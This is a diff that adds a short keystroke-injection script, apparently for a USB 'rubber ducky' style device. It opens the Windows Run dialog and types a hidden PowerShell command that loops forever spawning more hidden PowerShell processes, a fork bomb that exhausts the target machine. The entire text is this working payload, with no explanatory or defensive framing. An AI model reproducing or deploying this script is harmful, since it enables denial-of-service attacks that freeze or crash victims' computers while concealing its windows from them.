@@ -1,0 +1,5 @@
+DELAY 50
+GUI r
+DELAY 100
+STRING powershell -NoP -NonI -W Hidden -c "while($true){Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden'}"
+ENTER
